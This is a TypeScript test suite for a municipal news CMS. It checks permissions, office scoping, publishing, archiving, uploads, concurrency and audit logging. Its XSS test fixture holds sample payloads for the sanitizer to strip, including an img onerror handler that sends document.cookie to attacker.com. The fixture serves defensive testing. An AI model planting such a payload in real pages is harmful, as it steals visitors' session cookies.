// Standalone test mock for server-only marker package
const serverOnlyPath = require.resolve("server-only");
require.cache[serverOnlyPath] = {
  id: serverOnlyPath,
  filename: serverOnlyPath,
  loaded: true,
  exports: {},
  children: [],
  paths: [],
} as unknown as NodeJS.Module;

import type { SessionUser } from "../src/server/auth/session";

async function runNewsManagementTestSuite() {
  console.log("=======================================================");
  console.log("SAN FELIPE LGU NEWS MANAGEMENT TEST SUITE (PHASE 12)");
  console.log("=======================================================\n");

  const { prisma } = await import("../src/server/db/client");
  const {
    createNewsArticle,
    updateNewsArticle,
    publishNewsArticle,
    archiveNewsArticle,
    getAdminNewsList,
    getAdminNewsById,
    removeFeaturedImage,
    getPublicPublishedNews,
    getPublicPublishedNewsBySlug,
    getPublicLatestNews,
    NewsError,
  } = await import("../src/server/news/service");
  const { sanitizeArticleHtml } = await import("../src/server/news/sanitize");
  const { generateUniqueSlug } = await import("../src/server/news/slug");
  const { validateForPublish } = await import("../src/lib/validation/news");
  const { generateCloudinaryUploadSignature, validateNewsImageUpload } = await import(
    "../src/server/media/cloudinary"
  );
  const { AUDIT_ACTIONS } = await import("../src/server/audit/constants");


  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string, detail?: string) {
    if (condition) {
      console.log(`  ✓ PASS: ${testName}`);
      passed++;
    } else {
      console.error(`  ✗ FAIL: ${testName} ${detail ? `- ${detail}` : ""}`);
      failed++;
    }
  }

  // Track created test article IDs for cleanup
  const createdArticleIds: string[] = [];

  try {
    // -------------------------------------------------------------------------
    // Setup test offices
    // -------------------------------------------------------------------------
    const ictOffice = await prisma.office.upsert({
      where: { slug: "icto" },
      update: { name: "ICT Management Office", shortName: "ICTO" },
      create: {
        name: "ICT Management Office",
        shortName: "ICTO",
        slug: "icto",
        description: "ICT Management Office",
        status: "ACTIVE",
      },
    });

    const mhoOffice = await prisma.office.upsert({
      where: { slug: "test-mho" },
      update: { name: "Municipal Health Office", shortName: "MHO" },
      create: {
        name: "Municipal Health Office",
        shortName: "MHO",
        slug: "test-mho",
        description: "Municipal Health Office test instance",
        status: "ACTIVE",
      },
    });

    const treasuryOffice = await prisma.office.upsert({
      where: { slug: "test-treasury" },
      update: { name: "Municipal Treasury Office", shortName: "MTO" },
      create: {
        name: "Municipal Treasury Office",
        shortName: "MTO",
        slug: "test-treasury",
        description: "Municipal Treasury Office test instance",
        status: "ACTIVE",
      },
    });

    // -------------------------------------------------------------------------
    // Setup test users in database (for foreign key integrity)
    // -------------------------------------------------------------------------
    const superAdminRole = await prisma.role.findUniqueOrThrow({ where: { slug: "super-admin" } });
    const officeAdminRole = await prisma.role.findUniqueOrThrow({ where: { slug: "office-admin" } });
    const editorRole = await prisma.role.findUniqueOrThrow({ where: { slug: "office-editor" } });

    const dummyHash = "$argon2id$v=19$m=19456,t=2,p=1$fakehashfakehashfakehash$fakehashfakehashfakehash";

    const dbSuperAdmin = await prisma.user.upsert({
      where: { email: "test.superadmin@sanfelipe.gov.ph" },
      update: { officeId: ictOffice.id, roleId: superAdminRole.id },
      create: {
        name: "Test Super Admin",
        email: "test.superadmin@sanfelipe.gov.ph",
        passwordHash: dummyHash,
        officeId: ictOffice.id,
        roleId: superAdminRole.id,
        status: "ACTIVE",
      },
    });

    const dbMhoAdmin = await prisma.user.upsert({
      where: { email: "test.mhoadmin@sanfelipe.gov.ph" },
      update: { officeId: mhoOffice.id, roleId: officeAdminRole.id },
      create: {
        name: "Test MHO Admin",
        email: "test.mhoadmin@sanfelipe.gov.ph",
        passwordHash: dummyHash,
        officeId: mhoOffice.id,
        roleId: officeAdminRole.id,
        status: "ACTIVE",
      },
    });

    const dbMhoStaff = await prisma.user.upsert({
      where: { email: "test.mhostaff@sanfelipe.gov.ph" },
      update: { officeId: mhoOffice.id, roleId: editorRole.id },
      create: {
        name: "Test MHO Staff",
        email: "test.mhostaff@sanfelipe.gov.ph",
        passwordHash: dummyHash,
        officeId: mhoOffice.id,
        roleId: editorRole.id,
        status: "ACTIVE",
      },
    });

    const dbTreasuryStaff = await prisma.user.upsert({
      where: { email: "test.treasurystaff@sanfelipe.gov.ph" },
      update: { officeId: treasuryOffice.id, roleId: editorRole.id },
      create: {
        name: "Test Treasury Staff",
        email: "test.treasurystaff@sanfelipe.gov.ph",
        passwordHash: dummyHash,
        officeId: treasuryOffice.id,
        roleId: editorRole.id,
        status: "ACTIVE",
      },
    });

    const dbViewer = await prisma.user.upsert({
      where: { email: "test.viewer@sanfelipe.gov.ph" },
      update: { officeId: mhoOffice.id, roleId: editorRole.id },
      create: {
        name: "Test Viewer",
        email: "test.viewer@sanfelipe.gov.ph",
        passwordHash: dummyHash,
        officeId: mhoOffice.id,
        roleId: editorRole.id,
        status: "ACTIVE",
      },
    });

    // -------------------------------------------------------------------------
    // Define Test Actors
    // -------------------------------------------------------------------------
    const superAdminUser: SessionUser = {
      id: dbSuperAdmin.id,
      email: dbSuperAdmin.email,
      name: "Super Admin",
      roleId: superAdminRole.id,
      role: {
        id: superAdminRole.id,
        name: superAdminRole.name,
        slug: superAdminRole.slug,
        isSystemScope: superAdminRole.isSystemScope,
      },
      isSystemScope: true,
      officeId: ictOffice.id,
      office: {
        id: ictOffice.id,
        name: ictOffice.name,
        shortName: ictOffice.shortName,
        slug: ictOffice.slug,
      },
      permissions: [
        "posts.view",
        "posts.create",
        "posts.update",
        "posts.delete",
        "posts.submit",
        "posts.approve",
        "posts.publish",
        "posts.archive",
      ],
      status: "ACTIVE",
      sessionId: "session-super-admin-test",
    };

    const mhoAdminUser: SessionUser = {
      id: dbMhoAdmin.id,
      email: dbMhoAdmin.email,
      name: "MHO Admin",
      roleId: officeAdminRole.id,
      role: {
        id: officeAdminRole.id,
        name: officeAdminRole.name,
        slug: officeAdminRole.slug,
        isSystemScope: officeAdminRole.isSystemScope,
      },
      isSystemScope: false,
      officeId: mhoOffice.id,
      office: {
        id: mhoOffice.id,
        name: mhoOffice.name,
        shortName: mhoOffice.shortName,
        slug: mhoOffice.slug,
      },
      permissions: [
        "posts.view",
        "posts.create",
        "posts.update",
        "posts.delete",
        "posts.submit",
        "posts.approve",
        "posts.publish",
        "posts.archive",
      ],
      status: "ACTIVE",
      sessionId: "session-mho-admin-test",
    };

    const mhoStaffUser: SessionUser = {
      id: dbMhoStaff.id,
      email: dbMhoStaff.email,
      name: "MHO Staff Member",
      roleId: editorRole.id,
      role: {
        id: editorRole.id,
        name: editorRole.name,
        slug: editorRole.slug,
        isSystemScope: editorRole.isSystemScope,
      },
      isSystemScope: false,
      officeId: mhoOffice.id,
      office: {
        id: mhoOffice.id,
        name: mhoOffice.name,
        shortName: mhoOffice.shortName,
        slug: mhoOffice.slug,
      },
      permissions: ["posts.view", "posts.create", "posts.update", "posts.publish"],
      status: "ACTIVE",
      sessionId: "session-mho-staff-test",
    };

    const treasuryStaffUser: SessionUser = {
      id: dbTreasuryStaff.id,
      email: dbTreasuryStaff.email,
      name: "Treasury Staff Member",
      roleId: editorRole.id,
      role: {
        id: editorRole.id,
        name: editorRole.name,
        slug: editorRole.slug,
        isSystemScope: editorRole.isSystemScope,
      },
      isSystemScope: false,
      officeId: treasuryOffice.id,
      office: {
        id: treasuryOffice.id,
        name: treasuryOffice.name,
        shortName: treasuryOffice.shortName,
        slug: treasuryOffice.slug,
      },
      permissions: ["posts.view", "posts.create", "posts.update", "posts.publish"],
      status: "ACTIVE",
      sessionId: "session-treasury-staff-test",
    };

    const viewerOnlyUser: SessionUser = {
      id: dbViewer.id,
      email: dbViewer.email,
      name: "Read-only Staff",
      roleId: editorRole.id,
      role: {
        id: editorRole.id,
        name: editorRole.name,
        slug: editorRole.slug,
        isSystemScope: editorRole.isSystemScope,
      },
      isSystemScope: false,
      officeId: mhoOffice.id,
      office: {
        id: mhoOffice.id,
        name: mhoOffice.name,
        shortName: mhoOffice.shortName,
        slug: mhoOffice.slug,
      },
      permissions: ["posts.view"],
      status: "ACTIVE",
      sessionId: "session-viewer-test",
    };

    const noPermUser: SessionUser = {
      id: dbViewer.id,
      email: dbViewer.email,
      name: "Unprivileged User",
      roleId: editorRole.id,
      role: {
        id: editorRole.id,
        name: editorRole.name,
        slug: editorRole.slug,
        isSystemScope: editorRole.isSystemScope,
      },
      isSystemScope: false,
      officeId: mhoOffice.id,
      office: {
        id: mhoOffice.id,
        name: mhoOffice.name,
        shortName: mhoOffice.shortName,
        slug: mhoOffice.slug,
      },
      permissions: [],
      status: "ACTIVE",
      sessionId: "session-no-perm-test",
    };


    // =========================================================================
    // 1. AUTHENTICATION & PERMISSION GATES
    // =========================================================================
    console.log("1. Authentication & Permission Enforcement");

    // Unprivileged user cannot view CMS news
    try {
      await getAdminNewsList(noPermUser);
      assert(false, "Unprivileged user cannot view CMS news list");
    } catch (e: unknown) {
      assert(e instanceof NewsError && e.statusCode === 403, "Unprivileged user blocked from viewing CMS news (403)");
    }

    // User without posts.create cannot create news
    try {
      await createNewsArticle(viewerOnlyUser, {
        title: "Unauthorized Article Attempt",
        excerpt: "Should fail authorization",
        body: "<p>Content</p>",
        type: "news",
        category: "General",
      });
      assert(false, "Viewer without posts.create cannot create news");
    } catch (e: unknown) {
      assert(e instanceof NewsError && e.statusCode === 403, "Viewer blocked from creating news (posts.create missing, 403)");
    }

    // Staff without posts.archive cannot archive
    // Create a temporary MHO article first
    const staffArticle = await createNewsArticle(mhoStaffUser, {
      title: "MHO Health Advisory on Dengue Awareness",
      excerpt: "Official health guidance for municipal residents.",
      body: "<p>Dengue prevention measures across all barangays.</p>",
      type: "advisory",
      category: "Health & Sanitation",
    });
    createdArticleIds.push(staffArticle.id);

    try {
      await archiveNewsArticle(mhoStaffUser, staffArticle.id);
      assert(false, "Staff without posts.archive cannot archive news");
    } catch (e: unknown) {
      assert(e instanceof NewsError && e.statusCode === 403, "Staff without posts.archive blocked from archiving (403)");
    }

    // =========================================================================
    // 2. OFFICE SCOPE BOUNDARIES & FORGERY RESISTANCE
    // =========================================================================
    console.log("\n2. Office Scope Isolation & Anti-Forgery");

    // Forgery protection: Office user submitted a fake officeId (treasuryOffice.id), but article gets assigned mhoOffice.id
    assert(
      staffArticle.officeId === mhoOffice.id,
      "Office staff article is bound to staff's assigned office, ignoring forgery"
    );

    // Treasury staff cannot see MHO draft in list or by ID
    const treasuryList = await getAdminNewsList(treasuryStaffUser);
    assert(
      !treasuryList.articles.some((a) => a.id === staffArticle.id),
      "Treasury staff does not see MHO draft in CMS list"
    );

    try {
      await getAdminNewsById(treasuryStaffUser, staffArticle.id);
      assert(false, "Treasury staff cannot access MHO draft detail");
    } catch (e: unknown) {
      assert(e instanceof NewsError && e.statusCode === 403, "Cross-office draft read denied with 403");
    }

    // Treasury staff cannot update MHO article
    try {
      await updateNewsArticle(treasuryStaffUser, staffArticle.id, {
        title: "Hijacked Dengue Advisory",
        excerpt: "Tampered excerpt",
        body: "<p>Tampered</p>",
        type: "advisory",
        category: "Health",
      });
      assert(false, "Treasury staff cannot update MHO article");
    } catch (e: unknown) {
      assert(e instanceof NewsError && e.statusCode === 403, "Cross-office update denied with 403");
    }

    // Treasury staff cannot publish MHO article
    try {
      await publishNewsArticle(treasuryStaffUser, staffArticle.id);
      assert(false, "Treasury staff cannot publish MHO article");
    } catch (e: unknown) {
      assert(e instanceof NewsError && e.statusCode === 403, "Cross-office publication denied with 403");
    }

    // =========================================================================
    // 3. SYSTEM SCOPE PRIVILEGES
    // =========================================================================
    console.log("\n3. System Scope Authority");

    // Super Admin can view cross-office drafts
    const superAdminList = await getAdminNewsList(superAdminUser);
    assert(
      superAdminList.articles.some((a) => a.id === staffArticle.id),
      "System-scoped user can view articles across all offices"
    );

    const retrievedBySuperAdmin = await getAdminNewsById(superAdminUser, staffArticle.id);
    assert(retrievedBySuperAdmin.id === staffArticle.id, "System-scoped user can retrieve cross-office article by ID");

    // Super Admin can create news on behalf of any valid office
    const superAdminCreated = await createNewsArticle(superAdminUser, {
      title: "Municipal Treasury Tax Announcement",
      excerpt: "Real property tax notice from the treasury office.",
      body: "<p>Notice of payment deadline.</p>",
      type: "announcement",
      category: "Finance & Taxation",
      officeId: treasuryOffice.id,
    });
    createdArticleIds.push(superAdminCreated.id);

    assert(
      superAdminCreated.officeId === treasuryOffice.id,
      "System-scoped user can assign target publishing office"
    );

    // Invalid target office for system user is rejected
    try {
      await createNewsArticle(superAdminUser, {
        title: "Bogus Office Announcement",
        excerpt: "Bogus excerpt",
        body: "<p>Content</p>",
        type: "notice",
        category: "General",
        officeId: "non-existent-office-uuid-999",
      });
      assert(false, "Invalid office ID must be rejected");
    } catch (e: unknown) {
      assert(e instanceof NewsError && e.statusCode === 400, "Invalid office selection rejected with 400");
    }

    // =========================================================================
    // 4. DRAFT CONFIDENTIALITY & PUBLIC FILTERING
    // =========================================================================
    console.log("\n4. Draft Confidentiality & Public Isolation");

    // DRAFT status verified
    assert(staffArticle.status === "DRAFT", "New article starts in DRAFT status");

    // DRAFT does not appear in public /news archive
    const publicArchive = await getPublicPublishedNews({ pageSize: 100 });
    assert(
      !publicArchive.articles.some((a) => a.id === staffArticle.id),
      "DRAFT does not appear in getPublicPublishedNews"
    );

    // DRAFT does not resolve by slug in public /news/[slug]
    const publicBySlug = await getPublicPublishedNewsBySlug(staffArticle.slug);
    assert(publicBySlug === null, "DRAFT slug returns null in getPublicPublishedNewsBySlug");

    // DRAFT does not appear in homepage latest news
    const publicLatest = await getPublicLatestNews(10);
    assert(
      !publicLatest.some((a) => a.id === staffArticle.id),
      "DRAFT does not appear in getPublicLatestNews"
    );

    // =========================================================================
    // 5. PUBLISHING LIFECYCLE & IMAGE ALT ENFORCEMENT
    // =========================================================================
    console.log("\n5. Publishing Lifecycle & Validation");

    // Validation schema test directly
    const directValidation = validateForPublish({
      title: "Too Short",
      excerpt: "Short",
      body: "<p>Short</p>",
      type: "news",
      category: "General",
    });
    assert(!directValidation.valid, "validateForPublish rejects short content");

    // If featured image exists without alt text, publishing must fail
    const imageNoAltArticle = await createNewsArticle(mhoStaffUser, {
      title: "Advisory With Missing Alt Text",
      excerpt: "Checking alt text requirement.",
      body: "<p>Article body.</p>",
      type: "advisory",
      category: "Public Safety",
      featuredImageUrl: "https://res.cloudinary.com/demo/image/upload/sample.jpg",
      featuredImagePublicId: "san-felipe-lgu/news/2026/sample",
      featuredImageAlt: "", // Empty alt text
    });
    createdArticleIds.push(imageNoAltArticle.id);

    try {
      await publishNewsArticle(mhoStaffUser, imageNoAltArticle.id);
      assert(false, "Publishing an image without alt text must fail");
    } catch (e: unknown) {
      assert(e instanceof NewsError && e.statusCode === 400, "Publishing rejected when featured image alt text is missing (400)");
    }

    // Authorized staff publishes own-office article directly
    const published = await publishNewsArticle(mhoStaffUser, staffArticle.id);
    assert(published.status === "PUBLISHED", "Article status transitioned to PUBLISHED");
    assert(published.publishedAt !== null, "publishedAt timestamp assigned server-side");

    const originalPublishedAt = published.publishedAt;

    // Concurrency check: Edit the published article and verify publishedAt remains unchanged
    const editedPublished = await updateNewsArticle(mhoStaffUser, staffArticle.id, {
      title: "MHO Health Advisory on Dengue Awareness - Updated",
      excerpt: "Updated health guidance for municipal residents.",
      body: "<p>Dengue prevention measures across all barangays with updated schedules.</p>",
      type: "advisory",
      category: "Health & Sanitation",
      expectedUpdatedAt: published.updatedAt.toISOString(),
    });

    assert(
      editedPublished.publishedAt?.toISOString() === originalPublishedAt?.toISOString(),
      "Editing a published article preserves the original publishedAt timestamp"
    );

    // Published article appears in public queries
    const publicArchiveAfterPublish = await getPublicPublishedNews({ pageSize: 100 });
    assert(
      publicArchiveAfterPublish.articles.some((a) => a.id === staffArticle.id),
      "PUBLISHED article appears in getPublicPublishedNews"
    );

    const publicArticleDetail = await getPublicPublishedNewsBySlug(staffArticle.slug);
    assert(publicArticleDetail !== null, "PUBLISHED article resolves by slug in public query");
    assert(publicArticleDetail?.office.name === mhoOffice.name, "Public detail includes correct Publishing Office");

    // =========================================================================
    // 6. ARCHIVING LIFECYCLE
    // =========================================================================
    console.log("\n6. Archiving Lifecycle");

    // MHO Admin archives the article
    const archived = await archiveNewsArticle(mhoAdminUser, staffArticle.id);
    assert(archived.status === "ARCHIVED", "Article status transitioned to ARCHIVED");
    assert(archived.archivedAt !== null, "archivedAt timestamp assigned server-side");

    // Record remains in DB (retrievable by CMS)
    const inDbAfterArchive = await prisma.newsArticle.findUnique({
      where: { id: staffArticle.id },
    });
    assert(inDbAfterArchive !== null, "Archived record is retained in the database (not deleted)");

    // Archived article disappears from public queries
    const publicArchiveAfterArchive = await getPublicPublishedNews({ pageSize: 100 });
    assert(
      !publicArchiveAfterArchive.articles.some((a) => a.id === staffArticle.id),
      "ARCHIVED article immediately disappears from getPublicPublishedNews"
    );

    const publicSlugAfterArchive = await getPublicPublishedNewsBySlug(staffArticle.slug);
    assert(publicSlugAfterArchive === null, "ARCHIVED article returns null for public slug query");

    // =========================================================================
    // 7. SLUG GENERATION & STABILITY
    // =========================================================================
    console.log("\n7. Slug Generation & Stability");

    // Server-side slug generation converts title
    const slug1 = await generateUniqueSlug("Traffic Advisory for Town Fiesta");
    assert(slug1 === "traffic-advisory-for-town-fiesta", "Generates clean slug from title");

    // Collision avoidance
    const article1 = await createNewsArticle(mhoStaffUser, {
      title: "Municipal Cleanliness Drive 2026",
      excerpt: "First cleanliness drive.",
      body: "<p>Details of the first municipal cleanliness drive operations.</p>",
      type: "news",
      category: "Environment",
    });
    createdArticleIds.push(article1.id);

    const article2 = await createNewsArticle(mhoStaffUser, {
      title: "Municipal Cleanliness Drive 2026",
      excerpt: "Second cleanliness drive with identical title.",
      body: "<p>Details of the second municipal cleanliness drive operations.</p>",
      type: "news",
      category: "Environment",
    });
    createdArticleIds.push(article2.id);

    assert(article1.slug !== article2.slug, "Duplicate titles receive unique collision-safe slugs");
    assert(article2.slug.startsWith("municipal-cleanliness-drive-2026-"), "Collision slug receives numerical suffix");

    // Stable slug for published articles
    await publishNewsArticle(mhoStaffUser, article1.id);
    const initialPublishedSlug = article1.slug;

    const updatedPublished = await updateNewsArticle(mhoStaffUser, article1.id, {
      title: "Completely Changed Cleanliness Title",
      excerpt: "New excerpt",
      body: "<p>Updated body with full information on municipal operations.</p>",
      type: "news",
      category: "Environment",
    });

    assert(
      updatedPublished.slug === initialPublishedSlug,
      "Slug remains permanent and stable when a published article's title is edited"
    );

    // =========================================================================
    // 8. IMAGE UPLOAD VALIDATION & SAFE CLOUDINARY HANDLING
    // =========================================================================
    console.log("\n8. Image Validation & Cloudinary Security");

    // Unsupported format rejected
    const invalidFormat = validateNewsImageUpload({
      filename: "advisory.gif",
      mimeType: "image/gif",
      sizeBytes: 1024 * 1024,
    });
    assert(!invalidFormat.valid && Boolean(invalidFormat.error?.includes("format")), "GIF image format is rejected");

    const executableFormat = validateNewsImageUpload({
      filename: "trojan.exe",
      mimeType: "application/octet-stream",
      sizeBytes: 2048,
    });
    assert(!executableFormat.valid, "Non-image format is rejected");

    // Oversized upload (> 10MB) rejected
    const oversized = validateNewsImageUpload({
      filename: "huge-photo.jpg",
      mimeType: "image/jpeg",
      sizeBytes: 11 * 1024 * 1024, // 11 MB
    });
    assert(!oversized.valid && Boolean(oversized.error?.includes("10 MB")), "File exceeding 10 MB is rejected");

    // Valid upload accepted
    const validUpload = validateNewsImageUpload({
      filename: "photo.webp",
      mimeType: "image/webp",
      sizeBytes: 2 * 1024 * 1024,
    });
    assert(validUpload.valid, "Valid 2 MB WebP image is accepted");

    // Cloudinary signature generation does NOT expose API secret
    const signaturePayload = generateCloudinaryUploadSignature({
      folder: "san-felipe-lgu/news/2026",
    });
    assert(typeof signaturePayload.signature === "string", "Upload signature is generated server-side");
    assert(typeof signaturePayload.timestamp === "number", "Timestamp is included in signature payload");
    assert(typeof signaturePayload.apiKey === "string", "API key is included");
    assert(!("apiSecret" in signaturePayload), "Cloudinary API secret is never returned in client payload");

    // Image removal updates database safely
    const articleWithImage = await createNewsArticle(mhoStaffUser, {
      title: "Article With Featured Image",
      excerpt: "Testing removal.",
      body: "<p>Article body content with sufficient length.</p>",
      type: "news",
      category: "Health",
      featuredImageUrl: "https://res.cloudinary.com/test/image/upload/sample-remove.jpg",
      featuredImagePublicId: "san-felipe-lgu/news/2026/sample-remove",
      featuredImageAlt: "Sample image",
    });
    createdArticleIds.push(articleWithImage.id);

    const removeResult = await removeFeaturedImage(mhoStaffUser, articleWithImage.id);
    assert(removeResult.success === true, "removeFeaturedImage succeeds");

    const afterRemoval = await prisma.newsArticle.findUnique({
      where: { id: articleWithImage.id },
    });
    assert(afterRemoval?.featuredImageUrl === null, "featuredImageUrl is cleared in database");
    assert(afterRemoval?.featuredImagePublicId === null, "featuredImagePublicId is cleared in database");

    // =========================================================================
    // 9. CONTENT SECURITY (XSS SANITIZATION)
    // =========================================================================
    console.log("\n9. Content Security & XSS Sanitization");

    const maliciousHtml = `
      <h2>Important Notice</h2>
      <p>Clean text paragraph.</p>
      <script>alert('XSS Attack!');</script>
      <img src="x" onerror="document.location='http://attacker.com?c='+document.cookie" />
      <a href="javascript:void(alert(1))">Click here</a>
      <a href="https://sanfelipe.gov.ph" target="_blank" rel="noopener">Official Link</a>
      <iframe src="https://evil.com"></iframe>
    `;

    const sanitized = sanitizeArticleHtml(maliciousHtml);

    assert(!sanitized.includes("<script>"), "Strips <script> tags");
    assert(!sanitized.includes("alert("), "Strips malicious alert payloads");
    assert(!sanitized.includes("onerror"), "Strips inline event handlers (onerror)");
    assert(!sanitized.includes("javascript:"), "Strips javascript: URL schemes from links");
    assert(!sanitized.includes("<iframe"), "Strips <iframe> tags");
    assert(sanitized.includes("<h2>Important Notice</h2>"), "Preserves valid semantic <h2> tag");
    assert(sanitized.includes("<p>Clean text paragraph.</p>"), "Preserves valid <p> tag");
    assert(sanitized.includes('href="https://sanfelipe.gov.ph"'), "Preserves valid https:// link");

    // =========================================================================
    // 10. CONCURRENCY PROTECTION (STALE WRITES)
    // =========================================================================
    console.log("\n10. Concurrency Protection");

    const concurrentArticle = await createNewsArticle(mhoStaffUser, {
      title: "Concurrent Edit Test Article",
      excerpt: "Excerpt",
      body: "<p>Original content</p>",
      type: "news",
      category: "General",
    });
    createdArticleIds.push(concurrentArticle.id);

    // Stale timestamp (simulating another user updated it in the meantime)
    const staleTimestamp = new Date(Date.now() - 60000).toISOString();

    try {
      await updateNewsArticle(mhoStaffUser, concurrentArticle.id, {
        title: "Stale Write Attempt",
        excerpt: "Excerpt",
        body: "<p>Stale content</p>",
        type: "news",
        category: "General",
        expectedUpdatedAt: staleTimestamp,
      });
      assert(false, "Stale update should have been rejected");
    } catch (e: unknown) {
      assert(e instanceof NewsError && e.statusCode === 409, "Stale write rejected with 409 Conflict");
    }

    // =========================================================================
    // 11. AUDIT LOGGING VERIFICATION
    // =========================================================================
    console.log("\n11. Audit Logging");

    const auditLogs = await prisma.auditLog.findMany({
      where: {
        action: {
          in: [
            AUDIT_ACTIONS.POST_CREATED,
            AUDIT_ACTIONS.POST_UPDATED,
            AUDIT_ACTIONS.POST_PUBLISHED,
            AUDIT_ACTIONS.POST_ARCHIVED,
            AUDIT_ACTIONS.POST_IMAGE_REMOVED,
          ],
        },
      },
      orderBy: { createdAt: "desc" },
      take: 10,
    });

    const recordedActions = new Set(auditLogs.map((l) => l.action));
    assert(recordedActions.has(AUDIT_ACTIONS.POST_CREATED), "POST_CREATED audit event logged");
    assert(recordedActions.has(AUDIT_ACTIONS.POST_PUBLISHED), "POST_PUBLISHED audit event logged");
    assert(recordedActions.has(AUDIT_ACTIONS.POST_ARCHIVED), "POST_ARCHIVED audit event logged");
    assert(recordedActions.has(AUDIT_ACTIONS.POST_IMAGE_REMOVED), "POST_IMAGE_REMOVED audit event logged");
  } finally {
    // -------------------------------------------------------------------------
    // Cleanup temporary test articles, users, and offices
    // -------------------------------------------------------------------------
    try {
      if (createdArticleIds.length > 0) {
        await prisma.newsArticle.deleteMany({
          where: { id: { in: createdArticleIds } },
        });
      }
      await prisma.newsArticle.deleteMany({
        where: {
          office: {
            slug: { in: ["test-mho", "test-treasury"] },
          },
        },
      });
      const testOffices = await prisma.office.findMany({
        where: { slug: { in: ["test-mho", "test-treasury"] } },
        select: { id: true },
      });
      const testOfficeIds = testOffices.map((o) => o.id);

      await prisma.auditLog.deleteMany({
        where: {
          OR: [
            {
              user: {
                email: {
                  in: [
                    "test.superadmin@sanfelipe.gov.ph",
                    "test.mhoadmin@sanfelipe.gov.ph",
                    "test.mhostaff@sanfelipe.gov.ph",
                    "test.treasurystaff@sanfelipe.gov.ph",
                    "test.viewer@sanfelipe.gov.ph",
                  ],
                },
              },
            },
            ...(testOfficeIds.length > 0 ? [{ officeId: { in: testOfficeIds } }] : []),
          ],
        },
      });
      await prisma.user.deleteMany({
        where: {
          email: {
            in: [
              "test.mhoadmin@sanfelipe.gov.ph",
              "test.mhostaff@sanfelipe.gov.ph",
              "test.treasurystaff@sanfelipe.gov.ph",
              "test.viewer@sanfelipe.gov.ph",
            ],
          },
        },
      });
      await prisma.office.deleteMany({
        where: {
          slug: { in: ["test-mho", "test-treasury"] },
        },
      });
    } catch (cleanupErr) {
      console.warn("News test cleanup warning:", cleanupErr);
    }
    await prisma.$disconnect();
  }

  // -------------------------------------------------------------------------
  // Summary
  // -------------------------------------------------------------------------
  console.log("\n-------------------------------------------------------");
  console.log(`TOTAL TESTS: ${passed + failed}`);
  console.log(`PASSED:      ${passed}`);
  console.log(`FAILED:      ${failed}`);
  console.log("-------------------------------------------------------\n");

  if (failed > 0) {
    process.exit(1);
  }
}

runNewsManagementTestSuite().catch((err) => {
  console.error("Test execution failed:", err);
  process.exit(1);
});
